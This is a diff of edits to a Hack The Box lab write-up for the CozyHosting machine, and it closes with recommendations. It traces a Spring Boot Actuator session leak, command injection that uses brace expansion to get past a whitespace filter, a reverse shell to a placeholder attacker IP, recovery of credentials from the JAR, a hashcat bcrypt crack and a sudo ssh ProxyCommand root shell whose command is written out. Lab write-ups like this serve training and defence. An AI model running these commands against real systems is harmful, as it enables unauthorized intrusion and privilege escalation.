@@ -30,14 +30,14 @@ outcome: "Authenticated admin access, a command-injection foothold as the applic
 | Field | Value |
 |---|---|
 | Difficulty | Easy |
-| Target environment | Linux (Ubuntu) — nginx reverse proxy in front of a Spring Boot application |
+| Target environment | Linux (Ubuntu) with an nginx reverse proxy in front of a Spring Boot application |
 | Starting position | Unauthenticated network access |
 | Objective | Escalate from an exposed Spring Boot Actuator endpoint to root through command injection and a sudo ssh rule |
 | Outcome | Admin-panel access via a leaked session, command-injection shell as the application service user, SSH access through a reused credential, and root via `ssh` ProxyCommand |
 
 ## Actuator session leak to ProxyCommand root
 
-CozyHosting is an Easy Hack The Box Linux machine running a Spring Boot web application behind nginx. Enumeration exposed Spring Boot Actuator endpoints, including `/actuator/sessions`, which leaked an authenticated session for `<APPLICATION_USER>`. The admin panel's SSH connection feature passed the `username` parameter into a shell command, giving command injection; a whitespace filter was bypassed with bash brace expansion to land a foothold as the application service user. The deployed Spring Boot JAR contained cleartext PostgreSQL credentials, whose `users` table held bcrypt hashes; cracking the administrative hash recovered a password reused for the local `<LOCAL_USER>` account. Privilege escalation abused a sudo rule allowing `<LOCAL_USER>` to run `/usr/bin/ssh` as root and used `ProxyCommand` to spawn a root shell. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
+CozyHosting is an Easy Hack The Box Linux machine running a Spring Boot web application behind nginx. Enumeration exposed Spring Boot Actuator endpoints, including `/actuator/sessions`, which leaked an authenticated session for `<APPLICATION_USER>`. The admin panel's SSH connection feature passed the `username` parameter into a shell command, which allowed command injection, and bash brace expansion bypassed a whitespace filter to land a foothold as the application service user. The deployed Spring Boot JAR contained cleartext PostgreSQL credentials, whose `users` table held bcrypt hashes; cracking the administrative hash recovered a password reused for the local `<LOCAL_USER>` account. Privilege escalation abused a sudo rule allowing `<LOCAL_USER>` to run `/usr/bin/ssh` as root and used `ProxyCommand` to spawn a root shell. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
 
 **Attack path:** **Spring Boot Actuator session leak → admin panel access → command injection in the SSH feature → application-service-user shell → JAR and PostgreSQL credential recovery → bcrypt hash crack → password reuse for SSH access as `<LOCAL_USER>` → sudo `/usr/bin/ssh` `ProxyCommand` → root**
 
@@ -88,7 +88,7 @@ Result: the `/actuator` endpoint is reachable without authentication.
 
 ### 3. Session Leak via Actuator
 
-Observation: the Actuator `sessions` endpoint exposes active HTTP sessions.
+Observation: I checked the Actuator's `sessions` endpoint, which exposes active HTTP sessions.
 
 ```bash
 curl -s http://<TARGET_VHOST>/actuator/sessions
@@ -121,9 +121,9 @@ Location: http://<TARGET_VHOST>/admin?error=usage: ssh [...]
 /bin/bash: line 1: @<ATTACKER_IP>: command not found
 ```
 
-Significance: the redirected response reflects shell output inside the `error` parameter, confirming that attacker-controlled input reaches a shell command.
+Significance: the redirected response reflects shell output inside the `error` parameter, so attacker-controlled input reaches a shell command.
 
-Result: command injection is confirmed, but a payload containing spaces is rejected by a filter.
+Result: command injection is confirmed, but a filter rejects payloads containing spaces.
 
 ```text
 Username can't contain whitespaces!
@@ -137,7 +137,7 @@ host=<ATTACKER_IP>&username=;<COMMAND_INJECTION_PATTERN>
 
 Significance: brace expansion (`{cmd,arg1,arg2}`) produces a command line with arguments but no whitespace characters, so a whitespace-only filter provides no protection.
 
-Result: a reverse shell is received as the application service user.
+Result: a reverse shell comes back as the application service user.
 
 ```text
 <APPLICATION_SERVICE_USER>@<TARGET_HOST>:<APPLICATION_DIRECTORY>$ whoami
@@ -166,7 +166,7 @@ spring.datasource.password=<DB_PASSWORD>
 
 Significance: configuration inside a deployable artifact stores database credentials in cleartext, so any process that can read the JAR recovers them.
 
-Result: PostgreSQL credentials are recovered from the packaged configuration. Querying the `users` table returns bcrypt hashes.
+Result: the packaged configuration yields PostgreSQL credentials. Querying the `users` table returns bcrypt hashes.
 
 ```sql
 SELECT * FROM users;
@@ -183,7 +183,7 @@ Observation: the stored hashes are bcrypt, which is slow to brute force but crac
 hashcat -m 3200 '<BCRYPT_HASH_2>' <WORDLIST> -D 2
 ```
 
-Result: the administrative hash is cracked offline. The recovered password value is not reproduced.
+Result: the administrative hash cracks offline against the wordlist. The recovered password value is not reproduced.
 
 Observation: the recovered password is reused for the local `<LOCAL_USER>` account, and SSH accepts it.
 
@@ -193,7 +193,7 @@ ssh <LOCAL_USER>@<TARGET_HOST>
 
 Significance: reuse of a recovered application password for a system account turns a database disclosure into host access.
 
-Result: SSH access as `<LOCAL_USER>` is established with the reused password.
+Result: SSH access as `<LOCAL_USER>` succeeds with the reused password.
 
 ### 6. Privilege Escalation via sudo ssh ProxyCommand
 
@@ -210,7 +210,7 @@ User <LOCAL_USER> may run the following commands on <TARGET_HOST>:
 
 Significance: the wildcard grants arbitrary OpenSSH options. `ProxyCommand` executes a local helper command to establish the connection, and because sudo runs `ssh` as root, that helper executes with root privileges.
 
-Result: the rule is abused to run a helper command as root.
+Result: the wildcard rule runs a helper command as root.
 
 ```bash
 sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
@@ -223,12 +223,12 @@ root
 
 ## One obstacle: a whitespace filter, bypassed by braces
 
-- The `username` parameter rejected whitespace. Bash brace expansion (`{cmd,arg1,arg2}`) supplied separated arguments without literal spaces, bypassing the filter.
+- The `username` parameter rejected whitespace. Bash brace expansion (`{cmd,arg1,arg2}`) supplied separated arguments without literal spaces and so bypassed the filter.
 - The admin panel trusted user-controlled input inside a shell command; the whitespace filter alone was insufficient to prevent injection.
 
 ## Outcome: admin, service shell, and root via ProxyCommand
 
-The evidence establishes full compromise from unauthenticated web access to root command execution. Two transitions are documented results rather than captured command output: admin-panel access using the leaked session, and SSH access as `<LOCAL_USER>` using the recovered password.
+The evidence establishes full compromise from unauthenticated web access to root command execution. Two transitions are documented results, not captured command output: admin-panel access using the leaked session, and SSH access as `<LOCAL_USER>` with the recovered password. I could not verify either from the captured output.
 
 ## Recommendations: Actuator, injection, artifact secrets, reuse, and sudo ssh
 
